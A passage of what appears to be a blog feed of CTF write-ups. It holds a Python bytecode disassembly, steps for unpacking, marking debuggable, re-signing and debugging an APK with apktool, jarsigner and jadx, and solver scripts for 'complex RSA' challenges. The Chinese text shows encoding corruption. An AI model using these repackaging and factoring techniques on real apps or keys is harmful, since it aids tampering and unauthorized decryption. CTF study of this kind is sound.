class="line"></span><br><span class="line">  6          18 LOAD_NAME                4 (exec)</span><br><span class="line">             20 LOAD_NAME                3 (co)</span><br><span class="line">             22 CALL_FUNCTION            1</span><br><span class="line">             24 POP_TOP</span><br><span class="line">             26 LOAD_CONST               3 (None)</span><br><span class="line">             28 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object addRoundKey at 0x7f5223878a80, file &quot;&quot;, line 2&gt;:</span><br><span class="line">  3           0 LOAD_FAST                0 (state)</span><br><span class="line">              2 LOAD_FAST                1 (roundkey)</span><br><span class="line">              4 BINARY_XOR</span><br><span class="line">              6 RETURN_VALUE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            210 CALL_METHOD              1</span><br><span class="line">            212 STORE_NAME               7 (co)</span><br><span class="line"></span><br><span class="line"> 12         214 LOAD_NAME                8 (exec)</span><br><span class="line">            216 LOAD_NAME                7 (co)</span><br><span class="line">            218 CALL_FUNCTION            1</span><br><span class="line">            220 POP_TOP</span><br><span class="line">            222 LOAD_CONST              69 (None)</span><br><span class="line">            224 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object &lt;listcomp&gt; at 0x7f7b29b00a80, file &quot;&quot;, line 4&gt;:</span><br><span class="line">  4           0 BUILD_LIST               0</span><br><span class="line">              2 LOAD_FAST                0 (.0)</span><br><span class="line">        &gt;&gt;    4 FOR_ITER                14 (to 20)</span><br><span class="line">              6 STORE_FAST               1 (x)</span><br><span class="line">              8 LOAD_GLOBAL              0 (Sbox)</span><br><span class="line">             10 LOAD_METHOD              1 (index)</span><br><span class="line">             12 LOAD_FAST                1 (x)</span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 LIST_APPEND              2</span><br><span class="line">             18 JUMP_ABSOLUTE            4</span><br><span class="line">        &gt;&gt;   20 RETURN_VALUE</span><br><span class="line"></span><br><span class="line">Disassembly of &lt;code object &lt;listcomp&gt; at 0x7f7b29a76a80, file &quot;&quot;, line 9&gt;:</span><br><span class="line">  9           0 BUILD_LIST               0</span><br><span class="line">              2 LOAD_FAST                0 (.0)</span><br><span class="line">        &gt;&gt;    4 FOR_ITER                14 (to 20)</span><br><span class="line">              6 STORE_FAST               1 (x)</span><br><span class="line">              8 LOAD_GLOBAL              0 (PBox)</span><br><span class="line">             10 LOAD_METHOD              1 (index)</span><br><span class="line">             12 LOAD_FAST                1 (x)</span><br><span class="line">             14 CALL_METHOD              1</span><br><span class="line">             16 LIST_APPEND              2</span><br><span class="line">             18 JUMP_ABSOLUTE            4</span><br><span class="line">        &gt;&gt;   20 RETURN_VALUE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</details>
]]></content>
      <categories>
        <category>CTF-WP</category>
      </categories>
  </entry>
  <entry>
    <title>è®°å½•ç¬¬ä¸€æ¬¡jadx APKåŠ¨è°ƒ</title>
    <url>/2023/12/03/%E8%AE%B0%E5%BD%95%E7%AC%AC%E4%B8%80%E6%AC%A1jadx-APK%E5%8A%A8%E8%B0%83/</url>
    <content><![CDATA[<p>è¿™é‡Œä»¥NestarCTF2023 WEEK2çš„AndroDbgme ä¸ºä¾‹<br>è¯¦ç»†è®°å½•äº†å…³äºè§£åŒ…apk ä¿®æ”¹manifest åé‡ç­¾åæ‰“åŒ…åŠæœ€åjadxè°ƒè¯•çš„è¿‡ç¨‹</p>
<span id="more"></span>
<p>é¦–å…ˆåœ¨ç½‘ä¸Šä¸‹è½½apktool(æœ‰.jar å’Œ .bat)<br>ç„¶åæ”¾åœ¨ C&#x2F;Windowsä¸‹ é…ç½®ä¸€ä¸‹ç¯å¢ƒå˜é‡<br>ä½¿ç”¨å‘½ä»¤: apktool  d  xxx.apk å…ˆè§£åŒ…<br>ç„¶ååœ¨manifesté‡Œçš„è¿™é‡ŒåŠ ä¸Šä¸€å¥ ä½¿å¾—å…è®¸è°ƒè¯•</p>
<p><img src="https://s2.loli.net/2023/12/03/5N24EkviRs3Dbyn.png" alt="1AP~68`_X45`O17@M8SOR_R.png"></p>
<p>apktool  b  xxx é‡æ–°æ‰“åŒ…æˆapk</p>
<p>ç”±äºè¦é‡ç­¾å æ‰€ä»¥è¦ç”Ÿæˆkeystore<br><code>keytool -genkey -alias abc.keystore -keyalg RSA -validity 20000 -keystore abc.keystore</code></p>
<p>ç”Ÿæˆkeystoreåç­¾å</p>
<p><code>jarsigner -verbose -keystore abc.keystore -signedjar des.apk src.APK abc.keystore</code></p>
<p>ç­¾åå®Œæ¯•å°±å¯ä»¥å¾—åˆ°æ”¹è¿‡manifestçš„apkäº†</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯åŠ¨æ€è°ƒè¯• æˆ‘è¿™é‡Œç”¨çš„æ˜¯ jadx+é›·ç”µæ¨¡æ‹Ÿå™¨</p>
<p>åœ¨æ¨¡æ‹Ÿå™¨å¯åŠ¨apk</p>
<p>jadxæ‰“å¼€ ç‚¹å‡»debug</p>
<p><img src="https://s2.loli.net/2023/12/03/thwLBGubS9EMWp4.png" alt="img"></p>
<p>éšä¾¿ä¸‹ä¸ªæ–­ç‚¹ ç‚¹å‡»è¿è¡Œ å°±å¯ä»¥åœ¨apkçœ‹åˆ°flagäº†</p>
<p><img src="https://s2.loli.net/2023/12/03/4ERAbnhmViyXkzw.png" alt="img"></p>
]]></content>
      <categories>
        <category>CTF-Reverse</category>
      </categories>
  </entry>
  <entry>
    <title>DailyPlan</title>
    <url>/2023/12/03/DailyPlan/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="75f7e53a005bb82bd27f0875c05fae662a659c709f7ca598cf4433a69773834e">84ddd93a2d570b3707d5ad36f450649bd9089ff895aa022e66c86996c1b8d12f6b1a2e7545af9b92c954a9c981a69d03a814e0546808b15197565aa84da9fbdffd598111d62bb2b7441cb3a89a15939735e51debcd048bdf92fa3d4808693b555698723a51925ca7c3cb074886fa27b29df42402ae14b060aed6ca26281572fb5b6410022c9bc099074fd77ad46550242a4de171854d9edd59a42fe8b9c64bbb9037dd899199a5d80f8b49437d87fa7b44bcfd1f9f0bb13a64547677eceac1f00ab0e66d16f93e837cc352e1e12a30816ef6dbe1dafc9a1a3a30a4b0446912140de0b104b19b0cae993bc3843fd8a7626074290dc866897c59c83033f4a914b84adf61a0b652ee9005c9c0e46ec8035da88b7514b8335cf410e083e26cd3df83c0d4d001382f93aea62358d0fcf35f1a6f3b6bae9996a437ec32253cebdf305c3e329570809b8f7a28a09b49975678b89274f18141514680f49c4128f711953db14da40068bd88e0200718bd980a7ee026a69cf621106b0682cf6627680ebf57b04cc4f9e127c7fed5763a148ee9485de6b248fb417ea46b340f6c061cf68154e334ae92e5489047677e82470a6bdc307e885cf4c969385b221542e1b9d6fe8e61d0942f9a6128b32d71d4908f9b32e95aaf3b35ae26896ce276f84a0971e9aed34d2acd1da953faf8638e491d4c5d08f58f93fedf1a7f69a204a7dce0137a87570054e96048b267c3b89e6af05d8f1ebbb1b55bc56c20c2fa5e58417baee2b24b9520d607602bc17861cc9988759c4404e8dc46a24ee0f250d3daa8c7705f5ce5516f2ad0c5fd6b050882d9375a3621f7ab08dbcf9c8d4003055943e34ae372bcc61440ca50b0ea9bdfb152b11fa29675c2cbe7276220c0831c178df4236c885b0dbd1a8d8b5370239728085b44419d68147958db6a604a11d45af091949b2827c261d8d43f9c4501a74f43d51cf574697493715fdd6ad49de46d9c0f6f33bcc269413870fd53893f9ebc4ba7f97d62b83c9fb9c029e5c57a9d07d34f1a06d4ab9c19b5f851d6d67212ee82bb86e5ac933fc2af0e55fcc77b1232fc5b32cff5358c85e58f390cd7dae22bb7a63333d2f259d1aff04db186a2aaafa83a2ccae66de7e22b84d9a1d119be6ee23be7f6f2a8684db3eb846cac6f79de614b227f1a2d8e4c72d026b1db34ba28a4d8b47ca5f3d490a19a1d4f73eaf7b8cf175749193b34cc68d011f353c0501b05b4f995f2f2a70038523f0bd404c3d12c6221b2f97d607b35c4f41842430a9b05ce1b25aad3dd8ebb79ea81808f1cc74497f397b8ee165b199555483cc95d0dc0855b4acc75ec7b43e68883193a61be81a3d7a7f6c8befadb4f6c9a66f071837054c6c08c08dab9e05603201ebc99ca41379abb7d8a20e00892ecc9f05a4a6b32700c9d43ad1823ea1eae901d7f3442ae3e6279b343748c1481e3d0560619ab1ab04fbcf4c760f48f7d533b15cdada84bae85ea794187c80f576d9f6cfadfdcacab901a412ab790925bd8b23f6d76f5aebf9e633bc790198d64b7315a16fd4e6b25296830528f8db8cc4f607a0368583287189f937c0ebacaa4ea88d6656ed24a93135590b491bbd2d6669414f2f0e4f30bf1b0f2cff93c9f523c140d1c2776a3c50c2b8352af40eaa55946250019103b05edfac784f0569c39483bb0978e3fe0ab5f3156f5ec6937e7de5705127ff373a31a286ae3fd6acb77a29a788d5854aff1d265d4cb4a0b56efde5142da40ece1fa2b0c24d71c9ffb8ea0f6f87818cccd05467b742c1ece34eb9ff40f5c9b8a43e01b21ed336ae1792a313780e659dd258bfb8dd66d3462b75fd4ddb85473dd21d72e3e2fed01cbb5bc3fa7c773fd6662185f8ac27ea63d5704fcce3f1e3e85ad23bb0851ba1cf589d13c2bccae8f8d99d5c3cecd3fe2d811bc651279335f123d8a923f7fbe35897d8f26e0a35df37ea8c7a5e7002f30672c8f0ede99e4511f16a5ddbba65515f56be11f698b2176f75256ead99365525be065c97a25e642afd3074538b9ce706fccade0daab34a74ad9b8997fdcf968307ccd32d039835c86cd8a8bd4ab8ce0adc2e35d12bdb70f3ff71b790ca3eadcceb9d11b83c391635fdd6cea95fef0b81c98e9337447875f6d8bc97ffd54971432605403eafc202f91c3ef1970ec9c9b2a0bce85947de71fd6b60d726d821fdb416a5500a9075e05d1db2e37cc2815fbea6cc99879b09a233a0d5786951d1a8ed7a7cf4b7d0bbbc25e95b8d418ab2e89dc8eb4664e215b4751b1fd3bd8cea0bde629cd88148af416b94f1739129c4fa83f656f9bd92411b5c4444cb459e4e38b72bc9a7d823efcf57dcb0f70e717a7fcf9e4b8cf3e1e213e891799403f96ab42fc2f7aa751398b3bba3f0e2cf9a55209198806897317a0bd7d39f8c373a70c991d1defda4173db72f1a906c328efffc2466e3749f566048d55e17055ddb0b1a03bfab9fe4e797b17593742db524b0addd10d02afeb15c1572ca343b633569552c112e3c2106f0851bef6964fd0ab87b0bbac3eb92eb8b4568450dce90b2d521114392b7e7f530e15769d3e9b685c7bdcff4211773bb9b07c01fb15631f13124e1a77599c6d89d4e9a0deab58aa26e3e705662415708b1ebea7c75e8af31b8e4d49406d7ee093825b0d725ef3c4efff086c31f261b5a912fc0d7fdf18120d80f2b7f68c42a8a03c378d0a4a677acb308fe2618ebc67db2d0c91ede51eb33ec29a9268be588a53d5f9723b6df220d808f4553c9953f55a03bab53d928f540720886f486b6ad6074b215c37a4d604fc27ba992d9a50a137affa7c529811247235ffd7a6030be8aec09d61e9bb51bdbaa993c27a1b12ff11f26749d2fbfd72337ffb076686e9331d6fec6dffecb09df9cb496577766f517337fac4deb331740d7c49538765d456ea41d20e28ce776b79f524e5fab9962bb1b95ef87caf97dd7ba95fda581b363a58b5ae0352f5e5b1a710e13a8f170bed36c0011ddd49654b92d1d74b006c15dac83b00eb67b247de6d79172650104a48b66e249327664982bdb1c846dd75a3b6d0f9bc3a22ffb5f567dfe8dd3e5c8ae520a77c54a5a4df826903388c6cdb71907fe818ff77b87317a37a12b9973e77a0b46d9ebe0c715f95c24c4295104aa219948f8ea9e5612ec12a3793cf1e64c35ead19fdd3e56e1fccdb325b67ae7d6543d5aea1ef00edbdad5dac711e192cc7be9f32d7a4f3285607e6c41f63cc8324c160e9ad72bb9e1eca0c355186175fa03179060e3dade0173ffd76b948c065b7f39951fc5849e7f4592b55534a4b0dab370499a26f382d99c022213ee6db58e082ce73cce585d3c6616712541201f6f1856d70f8ee46aade1875ad61832a43d9377a311c47b97e94eb5cfce8a96265134eb41d400dd11c05ee521e98081d32c94d9441885c053e1b14d41a9e039d21d3d49bc3f2ee3bf720e9f375f9247224ba83ecb934068a7b5b9d8cc276d62dae2af005b9ab939a1d871bb4800733536540ff2a4da83792ed8d243941532de2678ed40b1439d9617b755efa718198793a2ba84395ccd8bb15b63e82664ae9e0c6c0c511f9d16de8d1d0eb6129d1348b31e08c3a4f4fe4fd66cebb0f2499ca5675560b6446661d3e203edd55b99c03ee3487e641b31bb000bb360c7992c0f4a07ec63ce9ab19468d49628ba2f6f4fb91f15281cbf3074e7f2d358a3a9c5508599ed6b53dd04ca30c158580d5306f88d15387d61e8de22ae180a49e1c2651ccc6b6333d40adfe7b8c7eb2f918b3c10116de5156143e12273dc6b1d58ab5b78ebd3e620efb0f68c336b40a2bdf</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>Complex RSA</title>
    <url>/2023/12/03/Complex-RSA/</url>
    <content><![CDATA[<p>å¤æ•°RSA</p>
<span id="more"></span>
<p>åœ¨GeekGame2023é‡åˆ°äº†å¤æ•°RSAçš„æ¦‚å¿µ æŒºæœ‰æ„æ€çš„(orz) è®°å½•ä¸€ä¸‹</p>
<h2 id="å¤æ•°åŸŸä¸Šçš„rsa-demo"><a href="#å¤æ•°åŸŸä¸Šçš„rsa-demo" class="headerlink" title="å¤æ•°åŸŸä¸Šçš„rsa demo"></a>å¤æ•°åŸŸä¸Šçš„rsa demo</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert,lcm,is_prime</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.setrecursionlimit(<span class="number">2047</span>)</span><br><span class="line"></span><br><span class="line">f = (<span class="number">378122348642214690905411683807377396279362526734068034297186493255873563264253248095197659138069664908850853277799239471404715546747080714581633876343291058815268009173602365587463522797812239900814474973941995698621021680129530453282192603316731832323767320307650941745085796583822798379896337325L</span>, <span class="number">205549984221850341303682190742446959375043769671555741781145106776498798455293849755553794941345135675348633855787880355726112506553703853175271830126908219803257875131387292937296039523359975622001865593227631119497003599166091642640101746534401068507972834895023584843991641629874709898672559632L</span>)</span><br><span class="line">e = <span class="number">59107</span></span><br><span class="line">p = <span class="number">228517792080140341</span></span><br><span class="line">q = <span class="number">1675909164550923263854591345270445396052847869117231939809062226222204253885693425526434134321712288675268468398852452684029376569327518089966506865838909486699078280423099271324646863671350838232140981094611254627738568184261530942469845202934677427234062382272736609418198352717</span></span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cadd</span>(<span class="params">a,b,n</span>):</span><br><span class="line">    <span class="keyword">return</span> (a[<span class="number">0</span>]+b[<span class="number">0</span>]%n,a[<span class="number">1</span>]+b[<span class="number">1</span>]%n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmul</span>(<span class="params">a,b,n</span>):</span><br><span class="line">    <span class="keyword">return</span> ((a[<span class="number">0</span>]*b[<span class="number">0</span>]-a[<span class="number">1</span>]*b[<span class="number">1</span>])%n,(a[<span class="number">0</span>]*b[<span class="number">1</span>]+a[<span class="number">1</span>]*b[<span class="number">0</span>])%n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cpow</span>(<span class="params">a,k,n</span>):</span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    <span class="keyword">if</span>(k%<span class="number">2</span>==<span class="number">0</span>):</span><br><span class="line">        a=cmul(a,a,n)</span><br><span class="line">        <span class="keyword">return</span> cpow(a,k/<span class="number">2</span>,n)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> cmul(a,cpow(cmul(a,a,n),(k-<span class="number">1</span>)/<span class="number">2</span>,n),n)</span><br><span class="line"></span><br><span class="line">o=lcm((p*p-<span class="number">1</span>),(q*q-<span class="number">1</span>))</span><br><span class="line">fm=cpow(f,invert(e,o),n)</span><br><span class="line"><span class="built_in">print</span>(fm)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¤æ•°ä¸­çš„æ¬§æ‹‰å‡½æ•°</p>
<ul>
<li>phi(p) &#x3D; p^2 - 1</li>
<li>phi(q) &#x3D; q^2 - 1</li>
<li>phi(n) &#x3D; phi(p) * phi(q)</li>
</ul>
<h2 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h2><h3 id="2023æå®¢å¤§æŒ‘æˆ˜-EzComplex"><a href="#2023æå®¢å¤§æŒ‘æˆ˜-EzComplex" class="headerlink" title="2023æå®¢å¤§æŒ‘æˆ˜-EzComplex"></a>2023æå®¢å¤§æŒ‘æˆ˜-EzComplex</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sage9.3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;FAKE&#123;Do_You_know_Complex_numbers&#125;&#x27;</span></span><br><span class="line">p = random_prime(<span class="number">1</span> &lt;&lt; <span class="number">384</span>)</span><br><span class="line">q = random_prime(<span class="number">1</span> &lt;&lt; <span class="number">384</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">N = <span class="built_in">pow</span>(p, <span class="number">2</span>) + <span class="built_in">pow</span>(q, <span class="number">2</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(N)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">122977267154486898127643454001467185956864368276013342450998567212966113302012584153291519651365278888605594000436279106907163024162771486315220072170917153855370362692990814276908399943293854077912175867886513964032241638851526276</span></span><br><span class="line"><span class="string">973990451943921675425625260267293227445098713194663380695161260771362036776671793195525239267004528550439258233703798932349677698127549891815995206853756301593324349871567926792912475619794804691721625860861059975526781239293017498</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>N &#x3D; p^2 + q^2 &#x3D; (p+qi) * (p-qi)<br>åœ¨å¤æ•°åŸŸä¸Šåˆ†è§£N éå†å…¶å› å­å°±èƒ½å¾—åˆ°p,q<br>ä¸€äº›sageç”¨æ³•è¯´æ˜:</p>
<ul>
<li>ZZ(i)[N]: åˆ›å»ºäº†ä¸€ä¸ªæ•´æ•°é«˜æ–¯ç¯</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="number">122977267154486898127643454001467185956864368276013342450998567212966113302012584153291519651365278888605594000436279106907163024162771486315220072170917153855370362692990814276908399943293854077912175867886513964032241638851526276</span></span><br><span class="line">N = <span class="number">973990451943921675425625260267293227445098713194663380695161260771362036776671793195525239267004528550439258233703798932349677698127549891815995206853756301593324349871567926792912475619794804691721625860861059975526781239293017498</span></span><br><span class="line">zn = ZZ[i](N)</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> divisors(zn):</span><br><span class="line">    p, q = <span class="built_in">int</span>(d[<span class="number">0</span>]), <span class="built_in">int</span>(d[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> is_prime(p) <span class="keyword">and</span> is_prime(q) <span class="keyword">and</span> p.bit_length()&gt;<span class="number">300</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;p= <span class="subst">&#123;p&#125;</span>\nq= <span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line">p= <span class="number">8732781022306464325787401448517171026218291389436971731700810979177651389459896422549428444142746055523338740248707</span></span><br><span class="line">q= <span class="number">29962125885196559918101088622575501736433575381042696980660846307183241725227137854663856022170515177120773072848343</span></span><br><span class="line">n = p*q</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line">d = modinv(<span class="number">65537</span>,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n))))</span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;D0_you_like_r41n?_i_pref3r_R1_ng&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="æœªçŸ¥æ¥æº"><a href="#æœªçŸ¥æ¥æº" class="headerlink" title="æœªçŸ¥æ¥æº"></a>æœªçŸ¥æ¥æº</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, totient</span><br><span class="line"><span class="comment"># where totient is a function used to calculate phi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Complex</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, re, im</span>):</span><br><span class="line">        self.re = re</span><br><span class="line">        self.im = im</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, c</span>):</span><br><span class="line">        re_ = self.re * c.re - self.im * c.im</span><br><span class="line">        im_ = self.re * c.im + self.im * c.re</span><br><span class="line">        <span class="keyword">return</span> Complex(re_, im_)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>([self.re, self.im])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">complex_pow</span>(<span class="params">c, exp, n</span>):</span><br><span class="line">    result = Complex(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> exp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> exp &amp; <span class="number">1</span>:</span><br><span class="line">            result = result * c</span><br><span class="line">            result.re = result.re % n</span><br><span class="line">            result.im = result.im % n</span><br><span class="line">        c = c * c</span><br><span class="line">        c.re = c.re % n</span><br><span class="line">        c.im = c.im % n</span><br><span class="line">        exp &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">msg, length</span>):</span><br><span class="line">    pad_length = length - <span class="built_in">len</span>(msg) - <span class="number">1</span></span><br><span class="line">    pad_data = os.urandom(pad_length)</span><br><span class="line">    <span class="keyword">return</span> msg + <span class="string">b&#x27;\x00&#x27;</span> + pad_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unpad</span>(<span class="params">msg</span>):</span><br><span class="line">    <span class="keyword">return</span> msg.split(<span class="string">b&quot;\x00&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">bits = <span class="number">512</span></span><br><span class="line">p = getPrime(bits)</span><br><span class="line">q = getPrime(bits)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">sha_flag = hashlib.sha256(flag).digest()</span><br><span class="line"></span><br><span class="line">m1 = Complex(</span><br><span class="line">        <span class="built_in">int</span>.from_bytes(sha_flag[:<span class="built_in">len</span>(sha_flag)//<span class="number">2</span>], <span class="string">&quot;big&quot;</span>),</span><br><span class="line">        <span class="built_in">int</span>.from_bytes(sha_flag[<span class="built_in">len</span>(sha_flag)//<span class="number">2</span>:], <span class="string">&quot;big&quot;</span>),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">m2 = Complex(</span><br><span class="line">        <span class="built_in">int</span>.from_bytes(pad(flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>], bits//<span class="number">4</span>-<span class="number">1</span>), <span class="string">&quot;big&quot;</span>),</span><br><span class="line">        <span class="built_in">int</span>.from_bytes(pad(flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:], bits//<span class="number">4</span>-<span class="number">1</span>), <span class="string">&quot;big&quot;</span>),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">phi = totient(p, q)</span><br><span class="line">e = q * inverse(p, phi)</span><br><span class="line">c1 = complex_pow(m1, e, n)</span><br><span class="line">c2 = complex_pow(m2, e, n)</span><br><span class="line"></span><br><span class="line">c1.show()</span><br><span class="line">c2.show()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[90554536599623574119664951128649936419332926063696768860765928746438458550068553748440108394673303800443215316190882880737918820592384729010491685487061658710808286341751196450604089438847354206384322610922839055308138101241906861635339635907663440043442187064090630207952625897567214431195621589834131462698, 9144096375153318849308858335764188418198064372272913164911615933938183103747900881824918069830188301084043148828961577193063557255905230182831945580084452509300200269659063051152684191139872067872645370760797859584822240361290678189844670289832298393156571913616456958845361092243648857334156534377833472900]</span></span><br><span class="line"><span class="string">[62925714576233017213228404230949787334346543378320798964656732359587152905032848271156799538355748406136742979043729040728123730886381468564779041856310262770766050213464073568850702827835472680885186487027698395099598698463717279017013124488699475168052581476224742146967412904416266652605031934025266540003, 62818668456104375760667670741457826560706388018921820295286033114468271151921637926389738844622672202424650967678199715932465104135980734708459543588178208672956785650944371545080965650112025782049517299538052360417245732776384089052839997333049599655001615752078742624898059780909287845495731050387891926520]</span></span><br><span class="line"><span class="string">n = 94040393367054633265453751757391098049234338193258976478647369399924701067077628840760704857546243644552533845934146003988635403227234096447871132283820920489003286967145732739404245319615714787916756200564828237043658350145929927911058782352154997346295194977765305107634012698472977467843980475009837261877</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè®¡ç®—p,qçš„phiæ˜¯å¤æ•°åŸŸä¸Šçš„è®¡ç®—æ–¹å¼:</p>
<ul>
<li>phi(p) &#x3D; p^2 - 1</li>
<li>phi(q) &#x3D; q^2 - 1</li>
<li>phi(n) &#x3D; phi(p) * phi(q)</li>
</ul>
<p><img src="https://s2.loli.net/2023/12/03/SetLslk9bdAMVp4.png" alt="img"></p>
<p>è¦æ—¶åˆ»è®°ä½phi(x) &#x3D; x^2 - 1</p>
<p>ç„¶å c1^n - m &#x3D; k1 * q<br>ç”±äºmä¸º128bits å®Œå…¨å¯ä»¥åœ¨modnä¸‹copperæ±‚å‡ºm!(æ›´æ–°äº†cooperçš„ç”¨æ³• ä»¥å‰åªä¼šç”¨æ¥å•ç‹¬æ±‚p,q å…¶å®å®ƒæ‰¾çš„æ˜¯æ¨¡nçš„ä¸€ä¸ªå› å­çš„æ„ä¹‰ä¸‹ä¸º0çš„æ ¹ å®Œå…¨å¯ä»¥ç”¨æ¥è§£kp,kqçš„æƒ…å†µ)</p>
<p>è¿™é‡Œæˆ‘ä»¬è¦è‡ªå·±åŠ ä¸€ä¸ªè¿”å›å®éƒ¨è™šéƒ¨çš„å‡½æ•° ä¸ç„¶è¿”å›çš„æ˜¯ä¸€ä¸ªComplexå¯¹è±¡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Complex</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, re, im</span>):</span><br><span class="line">        self.re = re</span><br><span class="line">        self.im = im</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, c</span>):</span><br><span class="line">        re_ = self.re * c.re - self.im * c.im</span><br><span class="line">        im_ = self.re * c.im + self.im * c.re</span><br><span class="line">        <span class="keyword">return</span> Complex(re_, im_)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>([self.re, self.im])</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_value</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.re,self.im</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">complex_pow</span>(<span class="params">c, exp, n</span>):</span><br><span class="line">    result = Complex(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> exp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> exp &amp; <span class="number">1</span>:</span><br><span class="line">            result = result * c</span><br><span class="line">            result.re = result.re % n</span><br><span class="line">            result.im = result.im % n</span><br><span class="line">        c = c * c</span><br><span class="line">        c.re = c.re % n</span><br><span class="line">        c.im = c.im % n</span><br><span class="line">        exp 